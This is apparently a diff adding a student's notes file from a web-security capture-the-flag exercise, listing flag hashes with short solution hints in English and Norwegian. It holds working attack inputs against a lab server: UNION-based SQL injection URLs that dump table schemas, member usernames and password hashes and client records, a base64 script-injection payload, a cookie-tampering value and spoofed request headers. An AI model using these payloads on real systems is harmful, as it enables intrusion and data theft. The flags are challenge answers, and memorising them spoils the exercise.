@@ -1,0 +1,23 @@
+01: 6995787b83acce070df9aaf07e98c40f (turbo intruder)
+02: ed0439c8cacd3df10fa1a009b189efe2 (edit reset password request to have ntnu email)
+03: 2d09dbd7e6eb6b96f3b632dea0a196d2 (curl -e "https://www.nsa.gov/" -A "6995787b83ac" http://129.241.200.165:39972/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c | grep flag)
+07: (wget -e robots=off  --recursive --no-parent --reject="index.html*" http://129.241.200.165:39972/.hidden/, så bruk bash scrip for  cate dem i rekkefølge inn i rett fil)
+09: 5be9ddc8c77921181cb9ab6e527c0fdc (i cookie 0000000000000000001dc9a8c7e805ebf7f73e63c940abdb03bffc6140f8a695)
+10alt: 9fe5b1212dad866d15abd9d29fc93da293f9a4ea9c67a0311f2e248b835f8
+14: 2d0a5e5fa25479364b502ea51a7b30c6 (http://129.241.200.165:39972/?page=media&src=data:text/html;base64,%20PHNjcmlwdD5hbGVydCgic3RhZ2UucG5nIik8L3NjcmlwdD4=)
+
+
+
+
+
+progress:
+	sql members:
+		http://129.241.200.165:39972/index.php?page=member&id=1%20union%20SELECT%20table_schema,%20table_name%20FROM%20information_schema.tables;%20&Submit=Submit#
+		129.241.200.165:39972/index.php?page=member&id=1 union SELECT * from clients ; &Submit=Submit#
+		http://129.241.200.165:39972/index.php?page=member&id=1%20union%20SELECT%20table_name,%20column_name%20from%20information_schema.columns;%20&Submit=Submit#
+		// fant denne med å se rundt i infromation schema
+		http://129.241.200.165:39972/index.php?page=member&id=1%20union%20SELECT%20username,%20password%20from%20Member_Brute_Force.db_default;%20&Submit=Submit#
+		
+		http://129.241.200.165:39972/index.php?page=member&id=-1+union+select+NULL%2C+concat%28first_name28%2C+last_name51%2C+townf8%2C+country80%2C+Commenta7%29+from+clients&Submit=Submit#
+		
+	ctrl f flag:  Xor bitwise all hash passwords in this table that begin with the same two hexadecimal characters as the Cookie Tampering Flag.
